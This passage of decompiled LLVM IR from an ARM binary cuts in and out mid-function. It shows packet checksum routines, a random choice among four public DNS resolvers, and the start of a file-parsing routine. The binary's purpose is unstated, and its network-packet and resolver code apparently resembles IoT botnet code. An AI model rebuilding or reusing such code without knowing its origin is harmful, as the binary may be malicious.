  store i1 %v9_e334, i1* %cpsr_z.global-to-local, align 1
  %v1_e338 = trunc i32 %v4_e330 to i8
  %v2_e338 = load i32, i32* @r4, align 4
  %v3_e338 = add i32 %v2_e338, 5
  %v4_e338 = inttoptr i32 %v3_e338 to i8*
  store i8 %v1_e338, i8* %v4_e338, align 1
  %v3_e33c = load i32, i32* @r4, align 4
  %v4_e33c = add i32 %v3_e33c, 4
  %v5_e33c = inttoptr i32 %v4_e33c to i8*
  store i8 %v1_e328, i8* %v5_e33c, align 1
  %v0_e340 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e340, label %dec_label_pc_e344, label %dec_label_pc_e328.dec_label_pc_e23c_crit_edge

dec_label_pc_e328.dec_label_pc_e23c_crit_edge:    ; preds = %dec_label_pc_e328
  %v1_e240.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e23c

dec_label_pc_e344:                                ; preds = %dec_label_pc_e328, %dec_label_pc_e230
  %v0_e344 = call i32 @function_fe60()
  %v1_e344 = trunc i32 %v0_e344 to i8
  store i32 %v0_e344, i32* %r0.global-to-local, align 4
  store i32 %v3_df5c, i32* @lr, align 4
  %v4_e34c = sdiv i32 %v0_e344, 256
  store i32 %v4_e34c, i32* %r3.global-to-local, align 4
  %v1_e350 = load i32, i32* @r6, align 4
  %v9_e350 = icmp eq i32 %v3_df5c, %v1_e350
  store i1 %v9_e350, i1* %cpsr_z.global-to-local, align 1
  %v3_e354 = load i32, i32* @r4, align 4
  %v4_e354 = add i32 %v3_e354, 20
  %v5_e354 = inttoptr i32 %v4_e354 to i8*
  store i8 %v1_e344, i8* %v5_e354, align 1
  %v0_e358 = load i32, i32* %r3.global-to-local, align 4
  %v1_e358 = trunc i32 %v0_e358 to i8
  %v2_e358 = load i32, i32* @r5, align 4
  %v3_e358 = add i32 %v2_e358, 1
  %v4_e358 = inttoptr i32 %v3_e358 to i8*
  store i8 %v1_e358, i8* %v4_e358, align 1
  %v0_e35c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e35c, label %dec_label_pc_e360, label %dec_label_pc_e344.dec_label_pc_e248_crit_edge

dec_label_pc_e344.dec_label_pc_e248_crit_edge:    ; preds = %dec_label_pc_e344
  %v1_e24c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e248

dec_label_pc_e360:                                ; preds = %dec_label_pc_e344, %dec_label_pc_e23c
  %v0_e360 = call i32 @function_fe60()
  %v1_e360 = trunc i32 %v0_e360 to i8
  %v4_e364 = sdiv i32 %v0_e360, 256
  store i32 %v4_e364, i32* %r3.global-to-local, align 4
  %v3_e368 = load i32, i32* @r5, align 4
  %v4_e368 = add i32 %v3_e368, 2
  %v5_e368 = inttoptr i32 %v4_e368 to i8*
  store i8 %v1_e360, i8* %v5_e368, align 1
  store i32 %v3_df60, i32* %r0.global-to-local, align 4
  %v1_e370 = load i32, i32* @r6, align 4
  %v9_e370 = icmp eq i32 %v3_df60, %v1_e370
  store i1 %v9_e370, i1* %cpsr_z.global-to-local, align 1
  %v0_e374 = load i32, i32* %r3.global-to-local, align 4
  %v1_e374 = trunc i32 %v0_e374 to i8
  %v2_e374 = load i32, i32* @r5, align 4
  %v3_e374 = add i32 %v2_e374, 3
  %v4_e374 = inttoptr i32 %v3_e374 to i8*
  store i8 %v1_e374, i8* %v4_e374, align 1
  %v0_e378 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e378, label %dec_label_pc_e37c, label %dec_label_pc_e254

dec_label_pc_e37c:                                ; preds = %dec_label_pc_e360, %dec_label_pc_e248
  %v0_e37c = call i32 @function_fe60()
  %v1_e37c = trunc i32 %v0_e37c to i8
  store i32 %v0_e37c, i32* %r0.global-to-local, align 4
  %v4_e380 = sdiv i32 %v0_e37c, 256
  store i32 %v4_e380, i32* %r3.global-to-local, align 4
  %v3_e384 = load i32, i32* @r4, align 4
  %v4_e384 = add i32 %v3_e384, 28
  %v5_e384 = inttoptr i32 %v4_e384 to i8*
  store i8 %v1_e37c, i8* %v5_e384, align 1
  %v0_e388 = load i32, i32* %r3.global-to-local, align 4
  %v1_e388 = trunc i32 %v0_e388 to i8
  %v2_e388 = load i32, i32* @r8, align 4
  %v3_e388 = add i32 %v2_e388, 1
  %v4_e388 = inttoptr i32 %v3_e388 to i8*
  store i8 %v1_e388, i8* %v4_e388, align 1
  br label %dec_label_pc_e254

dec_label_pc_e390:                                ; preds = %dec_label_pc_de5c, %dec_label_pc_de28, %dec_label_pc_ddcc, %dec_label_pc_dc74
  %v0_e390 = call i32 @function_fe60()
  %v1_e394 = urem i32 %v0_e390, 4
  store i32 %v1_e394, i32* %r0.global-to-local, align 4
  %v2_e398 = icmp eq i32 %v1_e394, 3
  store i1 %v2_e398, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_e390 to i2
  switch i2 %trunc, label %dec_label_pc_ded020 [
    i2 0, label %dec_label_pc_e3d8
    i2 1, label %dec_label_pc_e3ec
    i2 -2, label %dec_label_pc_e3f8
    i2 -1, label %dec_label_pc_e408
  ]

dec_label_pc_e3b4:                                ; preds = %dec_label_pc_df30
  store i32 %v2_dee0, i32* %r0.global-to-local, align 4
  %v4_e3b8 = sext i8 %v5_df4c to i32
  store i32 %v4_e3b8, i32* %r1.global-to-local, align 4
  %v2_e3bc = add i32 %v4_e3b8, %v2_dee0
  store i32 %v2_e3bc, i32* @fp, align 4
  br label %dec_label_pc_e1e8

dec_label_pc_e3c4:                                ; preds = %dec_label_pc_df04
  store i32 %v3_def4, i32* %r0.global-to-local, align 4
  %v1_e3c8 = call i32 @function_1369c(i32 %v3_def4)
  store i32 %v1_e3c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e3cc

dec_label_pc_e3cc:                                ; preds = %dec_label_pc_dedc, %dec_label_pc_ded0, %dec_label_pc_e3c4
  %v29_e3d4 = phi i32 [ %v3_def4, %dec_label_pc_dedc ], [ %v29_e3d474, %dec_label_pc_ded0 ], [ %v1_e3c8, %dec_label_pc_e3c4 ]
  store i32 %v3_dc74, i32* %r4.global-to-local, align 4
  store i32 %v15_dc74, i32* %r8.global-to-local, align 4
  store i32 %v18_dc74, i32* %sb.global-to-local, align 4
  store i32 %v21_dc74, i32* %sl.global-to-local, align 4
  store i32 %v24_dc74, i32* %fp.global-to-local, align 4
  ret i32 %v29_e3d4

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e390
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ded0

dec_label_pc_e3ec:                                ; preds = %dec_label_pc_e390
  store i32 707416650, i32* @r4, align 4
  br label %dec_label_pc_ded0

dec_label_pc_e3f8:                                ; preds = %dec_label_pc_e390
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ded0

dec_label_pc_e408:                                ; preds = %dec_label_pc_e390
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ded0

; uselistorder directives
  uselistorder i32 %v4_e3b8, { 0, 2, 1 }
  uselistorder i32 %v1_e394, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_e390, { 1, 0 }
  uselistorder i32 %v0_e37c, { 0, 2, 1 }
  uselistorder i32 %v0_e344, { 0, 2, 1 }
  uselistorder i32 %v4_e330, { 1, 0 }
  uselistorder i32 %v0_e328, { 0, 2, 1 }
  uselistorder i32 %v1_e304, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_e2a0, { 0, 2, 1 }
  uselistorder i32 %v0_e288, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e274, { 1, 0 }
  uselistorder i32 %v2_e270, { 0, 2, 1 }
  uselistorder i32 %v7_e21c, { 1, 0, 2 }
  uselistorder i32 %v4_e258.pre-phi, { 1, 0 }
  uselistorder i32 %v2_e19c, { 1, 0 }
  uselistorder i32 %v1_e19086, { 1, 0, 2 }
  uselistorder i32 %v1_e184, { 2, 1, 0 }
  uselistorder i32 %v0_e184, { 1, 2, 0 }
  uselistorder i32 %v0_e18432, { 1, 0 }
  uselistorder i32 %v1_e18433, { 2, 0, 1 }
  uselistorder i8 %extract.t78, { 1, 0 }
  uselistorder i32 %v1_e158, { 2, 0, 4, 1, 3, 5, 6 }
  uselistorder i32 %v0_e0d4, { 1, 0 }
  uselistorder i32 %v3_e010, { 1, 0, 2 }
  uselistorder i32 %v1_dfd8, { 1, 0 }
  uselistorder i32 %v1_dfcc, { 1, 0 }
  uselistorder i32 %v1_dfb0, { 1, 0 }
  uselistorder i32 %v1_df9c, { 1, 0 }
  uselistorder i32 %v3_df94, { 1, 0 }
  uselistorder i32 %v4_df8c, { 0, 4, 2, 5, 3, 1 }
  uselistorder i8 %v5_df4c, { 1, 0 }
  uselistorder i32 %v0_df48, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_df3c, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_df28, { 1, 0 }
  uselistorder i1 %v7_def8, { 1, 0 }
  uselistorder i32 %v3_def4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_dee0, { 0, 11, 1, 6, 4, 3, 7, 10, 9, 8, 5, 2 }
  uselistorder i32 %stack_var_-2176.0, { 1, 0 }
  uselistorder i32 %v1_dec8, { 1, 0, 2 }
  uselistorder i1 %v7_de98, { 1, 0 }
  uselistorder i32 %v1_de94, { 1, 0, 2 }
  uselistorder i1 %v8_de8c, { 1, 0 }
  uselistorder i1 %v7_de88, { 1, 0 }
  uselistorder i32 %v1_de7c, { 1, 0 }
  uselistorder i8 %v2_de70, { 2, 0, 1, 3 }
  uselistorder i32 %v0_de74, { 1, 0 }
  uselistorder i32 %v0_de94, { 3, 0, 2, 1 }
  uselistorder i32 %v0_de60, { 0, 2, 1 }
  uselistorder i32 %v1_de78, { 0, 2, 1 }
  uselistorder i32 %v2_de48, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_de40, { 1, 0, 2, 3 }
  uselistorder i32 %v0_de28, { 1, 2, 0, 3, 4, 5 }
  uselistorder i1 %v7_de20, { 1, 0 }
  uselistorder i32 %v0_de20, { 2, 3, 1, 4, 6, 5, 0 }
  uselistorder i32 %v0_ddc4, { 1, 0, 3, 2 }
  uselistorder i32 %v6_dd94, { 0, 3, 5, 4, 2, 1, 7, 6 }
  uselistorder i32 %v1_dd18, { 1, 0 }
  uselistorder i32 %v7_dcd4, { 0, 1, 2, 4, 3 }
  uselistorder i8 %v5_dcd0, { 1, 0 }
  uselistorder i32 %v6_dcb0, { 1, 0 }
  uselistorder i32 %v2_dc98, { 0, 3, 1, 2 }
  uselistorder i32 %v1_dc80, { 7, 4, 5, 6, 3, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 51, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 46, 45, 47, 49, 48, 51, 50, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 4, 7, 6, 8, 10, 9, 11, 13, 12, 14, 15, 16, 17, 1, 18, 19, 68, 33, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 37, 34, 35, 36, 38, 40, 39, 41, 42, 43, 45, 44, 47, 46, 48, 49, 51, 50, 52, 54, 53, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 0 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 21, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 30, 31, 32, 29, 26, 33, 34, 35 }
  uselistorder i32 41, { 4, 5, 6, 0, 2, 7, 1, 8, 3, 9 }
  uselistorder i32 134744072, { 1, 0 }
  uselistorder i32 707416650, { 1, 0 }
  uselistorder i32 104859200, { 1, 0 }
  uselistorder i32 33686020, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_a4e8, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 90, 91 }
  uselistorder label %dec_label_pc_e3cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e254, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e1f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e1e8, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %bb145, { 1, 0 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %dec_label_pc_dea4, { 1, 0 }
  uselistorder label %dec_label_pc_de98, { 1, 0 }
  uselistorder label %dec_label_pc_de5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_de54, { 1, 0 }
}

define i32 @function_e424(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e424:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_e454, label %dec_label_pc_e430

dec_label_pc_e430:                                ; preds = %dec_label_pc_e424
  %v0_e434.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e434

dec_label_pc_e434:                                ; preds = %dec_label_pc_e434, %dec_label_pc_e430
  %v0_e448 = phi i32 [ %v2_e448, %dec_label_pc_e434 ], [ 0, %dec_label_pc_e430 ]
  %v0_e43c = phi i32 [ %v1_e43c, %dec_label_pc_e434 ], [ %arg1, %dec_label_pc_e430 ]
  %v0_e44c = phi i32 [ %v1_e44c, %dec_label_pc_e434 ], [ %v0_e434.pre, %dec_label_pc_e430 ]
  %v1_e434 = inttoptr i32 %v0_e44c to i8*
  %v2_e434 = load i8, i8* %v1_e434, align 1
  %v3_e434 = zext i8 %v2_e434 to i32
  %v1_e438 = add i32 %v0_e44c, 1
  %v2_e438 = inttoptr i32 %v1_e438 to i8*
  %v3_e438 = load i8, i8* %v2_e438, align 1
  %v4_e438 = zext i8 %v3_e438 to i32
  %v1_e43c = add i32 %v0_e43c, -2
  %v4_e440 = mul nuw nsw i32 %v4_e438, 256
  %v5_e440 = or i32 %v4_e440, %v3_e434
  %v2_e448 = add i32 %v5_e440, %v0_e448
  %v1_e44c = add i32 %v0_e44c, 2
  store i32 %v1_e44c, i32* @r0, align 4
  %v1_e43c.cmp = icmp ugt i32 %v1_e43c, 1
  br i1 %v1_e43c.cmp, label %dec_label_pc_e434, label %dec_label_pc_e454

dec_label_pc_e454:                                ; preds = %dec_label_pc_e434, %dec_label_pc_e424
  %v1_e45c = phi i32 [ 0, %dec_label_pc_e424 ], [ %v2_e448, %dec_label_pc_e434 ]
  %v0_e454 = phi i32 [ %arg1, %dec_label_pc_e424 ], [ %v1_e43c, %dec_label_pc_e434 ]
  %v7_e454 = icmp eq i32 %v0_e454, 1
  br i1 %v7_e454, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e454
  %v1_e458 = load i32, i32* @r0, align 4
  %v2_e458 = inttoptr i32 %v1_e458 to i8*
  %v3_e458 = load i8, i8* %v2_e458, align 1
  %v4_e458 = zext i8 %v3_e458 to i32
  %v3_e45c = add i32 %v1_e45c, %v4_e458
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e454, %bb
  %v0_e460 = phi i32 [ %v1_e45c, %dec_label_pc_e454 ], [ %v3_e45c, %bb ]
  %v3_e464 = urem i32 %v0_e460, 65536
  %v4_e468 = udiv i32 %v0_e460, 65536
  %v5_e468 = add nuw nsw i32 %v4_e468, %v3_e464
  %v4_e46c = udiv i32 %v5_e468, 65536
  %v5_e46c = add nuw nsw i32 %v4_e46c, %v5_e468
  %v1_e470 = urem i32 %v5_e46c, 65536
  %v3_e478 = xor i32 %v1_e470, 65535
  ret i32 %v3_e478

; uselistorder directives
  uselistorder i32 %v5_e468, { 1, 0 }
  uselistorder i32 %v1_e44c, { 1, 0 }
  uselistorder i32 %v1_e43c, { 1, 0, 2 }
  uselistorder i32 %v0_e44c, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_e480(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e480:
  %v3_e490 = urem i32 %arg2, 65536
  %v1_e494 = add i32 %arg1, 12
  %v1_e498 = inttoptr i32 %v1_e494 to i32*
  %v2_e498 = load i32, i32* %v1_e498, align 4
  %v3_e498 = add i32 %arg1, 16
  %v4_e498 = inttoptr i32 %v3_e498 to i32*
  %v5_e498 = load i32, i32* %v4_e498, align 4
  %v7_e49c = icmp sgt i32 %arg3, 1
  br i1 %v7_e49c, label %dec_label_pc_e4a8.preheader, label %dec_label_pc_e4c8

dec_label_pc_e4a8.preheader:                      ; preds = %dec_label_pc_e480
  %v0_e4a8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_e4a8

dec_label_pc_e4a8:                                ; preds = %dec_label_pc_e4a8.preheader, %dec_label_pc_e4a8
  %v0_e4bc = phi i32 [ 0, %dec_label_pc_e4a8.preheader ], [ %v2_e4bc, %dec_label_pc_e4a8 ]
  %v0_e4b0 = phi i32 [ %arg3, %dec_label_pc_e4a8.preheader ], [ %v1_e4b0, %dec_label_pc_e4a8 ]
  %v0_e4c0 = phi i32 [ %v0_e4a8.pre, %dec_label_pc_e4a8.preheader ], [ %v1_e4c0, %dec_label_pc_e4a8 ]
  %v1_e4a8 = inttoptr i32 %v0_e4c0 to i8*
  %v2_e4a8 = load i8, i8* %v1_e4a8, align 1
  %v3_e4a8 = zext i8 %v2_e4a8 to i32
  %v1_e4ac = add i32 %v0_e4c0, 1
  %v2_e4ac = inttoptr i32 %v1_e4ac to i8*
  %v3_e4ac = load i8, i8* %v2_e4ac, align 1
  %v4_e4ac = zext i8 %v3_e4ac to i32
  %v1_e4b0 = add nsw i32 %v0_e4b0, -2
  %v4_e4b4 = mul nuw nsw i32 %v4_e4ac, 256
  %v5_e4b4 = or i32 %v4_e4b4, %v3_e4a8
  %v2_e4bc = add i32 %v5_e4b4, %v0_e4bc
  %v1_e4c0 = add i32 %v0_e4c0, 2
  store i32 %v1_e4c0, i32* @r1, align 4
  %v8_e4c4 = icmp sgt i32 %v1_e4b0, 1
  br i1 %v8_e4c4, label %dec_label_pc_e4a8, label %dec_label_pc_e4c8

dec_label_pc_e4c8:                                ; preds = %dec_label_pc_e4a8, %dec_label_pc_e480
  %v1_e4d0 = phi i32 [ 0, %dec_label_pc_e480 ], [ %v2_e4bc, %dec_label_pc_e4a8 ]
  %v0_e4c8 = phi i32 [ %arg3, %dec_label_pc_e480 ], [ %v1_e4b0, %dec_label_pc_e4a8 ]
  %v7_e4c8 = icmp eq i32 %v0_e4c8, 1
  br i1 %v7_e4c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e4c8
  %v1_e4cc = load i32, i32* @r1, align 4
  %v2_e4cc = inttoptr i32 %v1_e4cc to i8*
  %v3_e4cc = load i8, i8* %v2_e4cc, align 1
  %v4_e4cc = zext i8 %v3_e4cc to i32
  %v3_e4d0 = add i32 %v4_e4cc, %v1_e4d0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e4c8, %bb
  %v0_e4f4 = phi i32 [ %v1_e4d0, %dec_label_pc_e4c8 ], [ %v3_e4d0, %bb ]
  %v3_e4d8 = urem i32 %v2_e498, 65536
  %v1_e4e0 = add i32 %arg1, 9
  %v2_e4e0 = inttoptr i32 %v1_e4e0 to i8*
  %v3_e4e0 = load i8, i8* %v2_e4e0, align 1
  %v4_e4e0 = zext i8 %v3_e4e0 to i32
  %v3_e4e4 = urem i32 %v5_e498, 65536
  %v4_e4e8 = udiv i32 %v2_e498, 65536
  %v3_e4f0 = mul nuw nsw i32 %v4_e4e0, 256
  %v4_e4f4 = udiv i32 %v5_e498, 65536
  %v5_e4f4 = add i32 %v0_e4f4, %v4_e4f4
  %v2_e4f8 = add i32 %v5_e4f4, %v3_e4f0
  %v5_e4e8 = add nuw nsw i32 %v3_e4d8, %v3_e490
  %v2_e4ec = add nuw nsw i32 %v5_e4e8, %v4_e4e8
  %v2_e4fc = add nuw nsw i32 %v2_e4ec, %v3_e4e4
  %v2_e500 = add i32 %v2_e4f8, %v2_e4fc
  %tmp = icmp ult i32 %v2_e500, 65536
  br i1 %tmp, label %dec_label_pc_e520, label %dec_label_pc_e50c

dec_label_pc_e50c:                                ; preds = %.thread, %dec_label_pc_e50c
  %v2_e5141 = phi i32 [ %v2_e514, %dec_label_pc_e50c ], [ %v2_e500, %.thread ]
  %v3_e5182.in = phi i32 [ %v2_e514, %dec_label_pc_e50c ], [ %v2_e500, %.thread ]
  %v3_e5182 = udiv i32 %v3_e5182.in, 65536
  %v3_e510 = urem i32 %v2_e5141, 65536
  %v2_e514 = add nuw nsw i32 %v3_e510, %v3_e5182
  %tmp14 = icmp ult i32 %v2_e514, 65536
  br i1 %tmp14, label %dec_label_pc_e520.loopexit, label %dec_label_pc_e50c

dec_label_pc_e520.loopexit:                       ; preds = %dec_label_pc_e50c
  br label %dec_label_pc_e520

dec_label_pc_e520:                                ; preds = %dec_label_pc_e520.loopexit, %.thread
  %v0_e520 = phi i32 [ %v2_e514, %dec_label_pc_e520.loopexit ], [ %v2_e500, %.thread ]
  %v1_e520 = urem i32 %v0_e520, 65536
  %v3_e528 = xor i32 %v1_e520, 65535
  ret i32 %v3_e528

; uselistorder directives
  uselistorder i32 %v2_e514, { 2, 1, 3, 0 }
  uselistorder i32 %v2_e500, { 3, 0, 2, 1 }
  uselistorder i32 %v1_e4d0, { 1, 0 }
  uselistorder i32 %v1_e4c0, { 1, 0 }
  uselistorder i32 %v1_e4b0, { 0, 2, 1 }
  uselistorder i32 %v0_e4c0, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e50c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e4a8, { 1, 0 }
}

define i32 @function_e530(i32 %arg1) local_unnamed_addr {
dec_label_pc_e530:
  %v2_e534 = load i32, i32* @global_var_1ecc0.97, align 4
  %v2_e53c = call i32 @function_1379c(i32 %v2_e534, i32 9)
  %v0_e540 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e540, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_e530
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_e530, %bb
  ret i32 %v2_e53c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_e544(i32 %arg1) local_unnamed_addr {
dec_label_pc_e544:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e544 = load i32, i32* @r4, align 4
  store i32 %v3_e544, i32* %stack_var_-36, align 4
  %v6_e544 = load i32, i32* @r5, align 4
  %v9_e544 = load i32, i32* @r6, align 4
  %v12_e544 = load i32, i32* @r7, align 4
  %v15_e544 = load i32, i32* @r8, align 4
  %v18_e544 = load i32, i32* @sb, align 4
  %v21_e544 = load i32, i32* @sl, align 4
  %v24_e544 = load i32, i32* @fp, align 4
  %v2_e558 = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_e558, i32* @sl, align 4
  %v3_e560 = mul i32 %arg1, 65536
  store i32 %v3_e560, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  %v2_e56c = ptrtoint i32* %stack_var_-8773 to i32
  %v2_e578 = bitcast i32* %stack_var_-4677 to i8*
  %v3_e578 = call i32 @function_13cd0(i8* %v2_e578, i32 0)
  store i32 4096, i32* @r2, align 4
  %v2_e590 = bitcast i32* %stack_var_-8773 to i8*
  %v3_e590 = call i32 @function_13cd0(i8* %v2_e590, i32 0)
  %v2_e594 = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_e594, i32* @r6, align 4
  store i32 513, i32* @r2, align 4
  %v3_e5b4 = call i32 @function_13cd0(i8* nonnull %stack_var_-581, i32 0)
  %v2_e5b8 = ptrtoint i8* %stack_var_-68 to i32
  %v1_e5c0 = load i32, i32* @r5, align 4
  %v4_e5c0 = udiv i32 %v1_e5c0, 16777216
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_e5e0 = trunc i32 %v4_e5c0 to i8
  %v4_e5e0 = call i32 @function_131d0(i8 %v3_e5e0, i32 16, i32 %v2_e5b8)
  %v2_e5e8 = call i32 @function_12cdc(i8* nonnull %stack_var_-68)
  %v7_e5ec = icmp eq i32 %v2_e5e8, 2
  br i1 %v7_e5ec, label %dec_label_pc_ea80, label %dec_label_pc_e5f4

dec_label_pc_e5f4:                                ; preds = %dec_label_pc_e544, %dec_label_pc_ea80
  %v1_e5f8 = call i32 @function_123b0(i32 6)
  %v1_e600 = call i32 @function_123b0(i32 7)
  %v1_e608 = call i32 @function_123b0(i32 9)
  %v0_e610 = load i32, i32* @r4, align 4
  %v4_e614 = call i32 @function_137c8(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_15fa0.99, i32 0, i32 0), i32 %v0_e610)
  %v7_e618 = icmp eq i32 %v4_e614, -1
  store i32 %v4_e614, i32* @r8, align 4
  br i1 %v7_e618, label %dec_label_pc_ea40, label %dec_label_pc_e624.preheader

dec_label_pc_e624.preheader:                      ; preds = %dec_label_pc_e5f4
  %v4_e63058 = call i32 @function_12f34(i8* nonnull %stack_var_-581, i32 512, i32 %v4_e614)
  %v2_e63460 = icmp eq i32 %v4_e63058, 0
  br i1 %v2_e63460, label %dec_label_pc_e7c4.loopexit, label %dec_label_pc_e63c.lr.ph

dec_label_pc_e63c.lr.ph:                          ; preds = %dec_label_pc_e624.preheader
  %v2_e684 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_e63c

dec_label_pc_e63c:                                ; preds = %dec_label_pc_e63c.lr.ph, %dec_label_pc_e624.backedge
  %v3_e640 = load i8, i8* %stack_var_-581, align 1
  %v4_e640 = sext i8 %v3_e640 to i32
  %v2_e644 = icmp eq i8 %v3_e640, 0
  br i1 %v2_e644, label %bb130, label %bb

bb:                                               ; preds = %dec_label_pc_e63c
  %v8_e648 = icmp eq i8 %v3_e640, 58
  br i1 %v8_e648, label %.thread6, label %dec_label_pc_e65c

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_e674

bb130:                                            ; preds = %dec_label_pc_e63c
  br label %dec_label_pc_e674

dec_label_pc_e65c:                                ; preds = %bb
  %v1_e664.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e660

dec_label_pc_e660:                                ; preds = %bb131, %dec_label_pc_e65c
  %v0_e660 = phi i32 [ %v1_e660, %bb131 ], [ 0, %dec_label_pc_e65c ]
  %v1_e660 = add i32 %v0_e660, 1
  %v2_e664 = add i32 %v1_e660, %v1_e664.pre
  %v3_e664 = inttoptr i32 %v2_e664 to i8*
  %v4_e664 = load i8, i8* %v3_e664, align 1
  %v6_e664 = zext i8 %v4_e664 to i32
  %v2_e668 = icmp eq i8 %v4_e664, 0
  br i1 %v2_e668, label %dec_label_pc_e674, label %bb131

bb131:                                            ; preds = %dec_label_pc_e660
  %v8_e66c = icmp eq i8 %v4_e664, 58
  br i1 %v8_e66c, label %dec_label_pc_e674, label %dec_label_pc_e660

dec_label_pc_e674:                                ; preds = %dec_label_pc_e660, %bb131, %bb130, %.thread6
  %v1_e6a0 = phi i32 [ 0, %.thread6 ], [ 0, %bb130 ], [ %v1_e660, %bb131 ], [ %v1_e660, %dec_label_pc_e660 ]
  %v0_e674 = phi i32 [ %v4_e640, %.thread6 ], [ %v4_e640, %bb130 ], [ %v6_e664, %bb131 ], [ %v6_e664, %dec_label_pc_e660 ]
  %v2_e674 = icmp eq i32 %v0_e674, 0
  br i1 %v2_e674, label %dec_label_pc_e624.backedge, label %dec_label_pc_e67c

